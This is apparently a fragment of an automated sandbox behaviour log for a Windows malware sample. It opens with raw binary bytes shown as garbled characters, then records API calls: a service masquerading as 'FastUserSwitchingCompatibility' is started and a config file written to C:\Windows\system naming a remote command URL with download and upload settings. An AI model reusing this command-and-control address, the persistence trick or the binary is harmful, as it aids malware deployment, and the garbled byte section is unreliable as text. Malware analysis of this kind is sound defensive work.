Ét\";O\bw\u001dw\u0004j\u0004\u0003ñh\\#\u0002\u0010VèJ\u0000\u0000Ä\fÀ\u000fZþÿÿ[øûÿÿ^ë\u0003ÈÿMü3Í_èÇ\u0000\u0000ÉÂ\u0004\u0000éó¥\u0000\u0000Uìì8\u0001\u0000\u0000¡ \u0002\u00103ÅEüE\bWÈþÿÿE\f3ÿÌþÿÿ;Çu\u00073Àéß\u0000\u0000\u0000Sh$\u0001\u0000\u0000ØþÿÿWP½Ðþÿÿ½Ôþÿÿèò\u0000\u0000Ä\fh\u0004$\u0002\u0010ÿ\u0015\\ \u0002\u0010hè#\u0002\u0010Pÿ\u0015X \u0002\u0010Wj\u0002ÿÐØûÿu\u00073Àé\u0000\u0000\u0000VÔþÿÿPSÇÔþÿÿ(\u0001\u0000\u0000è\u0000\u00005< \u0002\u0010ë3ÿµÌþÿÿè\u001b«\u0000\u0000YPøþÿÿPè\r«\u0000\u0000YPèµ¨\u0000\u0000YYÀt\u0013ÔþÿÿPSèX\u0000\u0000ÀuÉë/ÿµÜþÿÿWh\u0000\u0004\u0000\u0000ÿ\u0015L \u0002\u0010ÿµÈþÿÿøhÿ\u0001\u000f\u0000Wÿ\u0015\u0018 \u0002\u0010WÐþÿÿÿÖSÿÖÐþÿÿ^[Mü3Í_è¡\u0000\u0000ÉÃUìì\f\u0000\u0000¡ \u0002\u00103ÅEüE\bóÿÿE\fóÿÿE\u0010S3Ûóÿÿ¨óÿÿ3Àf\u000f¾@$\u0002\u0010fÁá\u0002fLE°@ø%|éE°óÿÿ¬óÿÿP¤óÿÿPSSÇóÿÿJ\u0000\u0000\u0000ÿ\u0015\u0014 \u0002\u0010À\u000fL\u0001\u0000\u00003À óÿÿ9¤óÿÿ\u000f8\u0001\u0000\u0000VWð¬óÿÿ\u0004°x\u0004\u0001\u000fÓ\u0000\u0000\u0000¿,$\u0002\u0010Wè®\u0000\u0000P¬óÿÿ\u0004°Wÿp\bè«\u0000\u0000Ä\u0010À\u000fª\u0000\u0000\u0000¬óÿÿ\f°I\u001cóÿÿ\u0004°@\u0018óÿÿ|óÿÿPSSSóÿÿPSóÿÿPÿ\u00150 \u0002\u0010Àtiÿµóÿÿ°ûÿÿh($\u0002\u0010PèÖ©\u0000\u0000°ûÿÿj:Pè*\u0000\u0000ø°ûÿÿP°óÿÿP\u001fè\u0000\u0000G°÷ÿÿWPè\u0000\u0000¬óÿÿ\u0004°@\bÿµóÿÿPèÝ\u0000\u0000Ä,Àu\u001b óÿÿ@ óÿÿ;¤óÿÿ\u000fÿþÿÿë1°óÿÿPÿµóÿÿè9\u0000\u0000°÷ÿÿPÿµóÿÿè'\u0000\u0000Ä\u0010Ç¨óÿÿ\u0001\u0000\u0000\u0000_^Mü¨óÿÿ3Í[èÁ\u0000\u0000ÉÃUìì|\t\u0000\u0000¡ \u0002\u00103ÅEüE\fS]\u0010Vu\bÄöÿÿE\u0018WàöÿÿE\u001c3ÿj8ØöÿÿöÿÿWP½äöÿÿè÷\u0000\u0000ìûÿÿöÿÿ¸\u0004\u0001\u0000\u0000Ä\föÿÿöÿÿ´öÿÿ¼öÿÿöÿÿPôýÿÿöÿÿWðüÿÿ°öÿÿWèúÿÿVÇöÿÿ<\u0000\u0000\u0000¸öÿÿÿ\u0015T\"\u0002\u0010À\u000fª\u0002\u0000\u0000èöÿÿh$\u0002\u0010PèR¨\u0000\u0000YYWWWWht$\u0002\u0010ÿ\u0015X\"\u0002\u0010Ìöÿÿ;Ç\u000ft\u0002\u0000\u0000ÿu\u00145d\"\u0002\u0010Sj&PÿÖ\u001d\\\"\u0002\u0010WWj\u0003WWÿµöÿÿÿµöÿÿÿµÌöÿÿÿÓÐöÿÿ;ß\u000f+\u0002\u0000\u0000ÿµàöÿÿèM\u0000\u0000Y@Pÿµàöÿÿj+ÿµÐöÿÿÿÖÿµØöÿÿè/\u0000\u0000Y@PÿµØöÿÿj,ÿµÐöÿÿÿÖÿµ¸öÿÿøþÿÿÿµ°öÿÿhl$\u0002\u0010Pè§\u0000\u0000Ä\u0010Wh\u0000\u0001@WWWøþÿÿPhh$\u0002\u0010ÿµÐöÿÿÿ\u0015`\"\u0002\u0010Üöÿÿ;Ç\u000f\u0001\u0000\u0000j\u0004[SØöÿÿQj\u0002PÇØöÿÿ`ê\u0000\u0000ÿÖSØöÿÿPj\u0005ÿµÜöÿÿÿÖSØöÿÿPj\u0006ÿµÜöÿÿÿÖWèöÿÿWPè\u0000\u0000YPèöÿÿPÿµÜöÿÿÿ\u0015h\"\u0002\u0010WðÀöÿÿPÈöÿÿPh\u0013\u0000\u0000 ÿµÜöÿÿÀöÿÿÿ\u0015l\"\u0002\u0010;÷\u000f÷\u0000\u0000\u0000½ÈöÿÿÈ\u0000\u0000\u0000\u000fç\u0000\u0000\u00005h \u0002\u0010½Ôöÿÿ½àöÿÿ»\u0000 \u0000\u00009½äöÿÿu\u001cSj\bÿÖPÿ\u0015d \u0002\u0010äöÿÿ;Ç\u000f®\u0000\u0000\u0000ëHÿµäöÿÿWÿÖPÿ\u0015p \u0002\u0010+Ôöÿÿ;Ãs.ÿµäöÿÿWÿÖPÿ\u0015p \u0002\u0010\u0003ÃPÿµäöÿÿj\bÿÖPÿ\u0015l \u0002\u0010;ÇtTäöÿÿàöÿÿPÔöÿÿ\u0003äöÿÿSPÿµÜöÿÿ½àöÿÿÿ\u0015p\"\u0002\u0010Àt#àöÿÿ;Çt/\u0001ÔöÿÿÄöÿÿÔöÿÿ\béFÿÿÿÿµäöÿÿWÿÖPÿ\u0015` \u0002\u0010½äöÿÿÿµÜöÿÿÿ\u0015t\"\u0002\u0010ÿµÐöÿÿÿ\u0015t\"\u0002\u0010ÿµÌöÿÿÿ\u0015t\"\u0002\u0010äöÿÿMü_^3Í[èH\u007f\u0000\u0000ÉÃUìì|\t\u0000\u0000¡ \u0002\u00103ÅEüE\fSVu\b3Ûj8ÌöÿÿöÿÿSPäöÿÿè~\u0000\u0000ðüÿÿöÿÿ¸\u0004\u0001\u0000\u0000Ä\f",
+  "offset": 0
+}
+{
+  "handle": "0x00000098"
+}
+{
+  "desired_access": 2,
+  "machine_name": "",
+  "database_name": ""
+}
+{
+  "service_handle": "0x005a1240",
+  "service_name": "FastUserSwitchingCompatibility",
+  "service_manager_handle": "0x005a11f0",
+  "desired_access": 65552
+}
+{
+  "basename": "advapi32",
+  "module_address": "0x773f0000",
+  "flags": 0,
+  "module_name": "advapi32.dll",
+  "stack_pivoted": 0
+}
+{
+  "ordinal": 0,
+  "module": "ADVAPI32",
+  "module_address": "0x773f0000",
+  "function_address": "0x77433543",
+  "function_name": "StartServiceA"
+}
+{
+  "service_handle": "0x005a1240",
+  "service_name": "FastUserSwitchingCompatibility",
+  "arguments": []
+}
+{
+  "skipped": 0,
+  "milliseconds": 10
+}
+{
+  "create_disposition": 3,
+  "file_handle": "0x00000098",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "desired_access": "0xc0100000",
+  "file_attributes": 128,
+  "filepath_r": "\\??\\C:\\Windows\\system\\config_t.dat",
+  "create_options": 96,
+  "status_info": 1,
+  "share_access": 7
+}
+{
+  "file_handle": "0x00000098",
+  "information_class": 5
+}
+{
+  "process_identifier": 2404,
+  "region_size": 1052672,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 8192,
+  "base_address": "0x013a0000"
+}
+{
+  "process_identifier": 2404,
+  "region_size": 4096,
+  "stack_dep_bypass": 0,
+  "stack_pivoted": 0,
+  "heap_dep_bypass": 0,
+  "protection": 4,
+  "process_handle": "0xffffffff",
+  "allocation_type": 4096,
+  "base_address": "0x013a0000"
+}
+{
+  "file_handle": "0x00000098",
+  "buffer": "[Option]\r\nWebPage=http://sunshine.59.ydli.net/sespor/gnsatzm/jknml/aneywsf.asp\r\nDownCmdTime=10\r\nUploadRate=128\r\n[Other]\r\nUP=0\r\n[OtherTwo]\r\nAutoCheck=1\r\n",
+  "length": 152,
+  "offset": 0
+}
+{
+  "file_handle": "0x00000098",
+  "filepath": "C:\\Windows\\system\\config_t.dat",
+  "buffer": "ServiceName=FastUserSwitchingCompatibility\r\n[Other]\r\nUP=0\r\n[OtherTwo]\r\nAutoCheck=1\r\n",
+  "offset": 112
+}
+{
+  "file_handle": "0x00000098",
+  "information_class": 20
+}
+{
+  "free_type": 32768,
+  "process_identifier": 2404,
+  "process_handle": "0xffffffff",
+  "base_address": "0x013a0000",
+  "size": 1052672
+}
+{
+  "handle": "0x00000098"
+}
+{
+  "module_name": "mscoree.dll",
+  "stack_pivoted": 0,
+  "module_address": "0x00000000"
+}
+{
+  "module_name": "mscoree.dll",
+  "stack_pivoted": 0,
+  "module_address": "0x00000000"
+}
+{
+  "status_code": "0x00000000",
+  "process_identifier": 0,
+  "process_handle": "0x00000000"
+}
+{
+  "status_code": "0x00000000",
+  "process_identifier": 0,
+  "process_handle": "0x00000000"
+}
+{
+  "handle": "0x00000018"
+}
+{
+  "handle": "0x00000030"
+}
+{
+  "handle": "0x00000058"
+}
+{
+  "library": "IMM32",
+  "module_address": "0x77270000"
+}
+{
+  "key_handle": "0x00000058",
+  "desired_access": "0x00020019",
+  "regkey": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\GRE_Initialize"
+}
+{
+  "key_handle": "0x00000058",
+  "key_name": "",
+  "value": "",
+  "reg_type": 0,
+  "information_class": 2,
+  "regkey": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\GRE_Initialize\\DisableMetaFiles"
+}
+{
+  "handle": "0x00000058"
+}
+{
+  "status_code": "0x00000000",
+  "process_identifier": 2404,
+  "process_handle": "0xffffffff"
+}
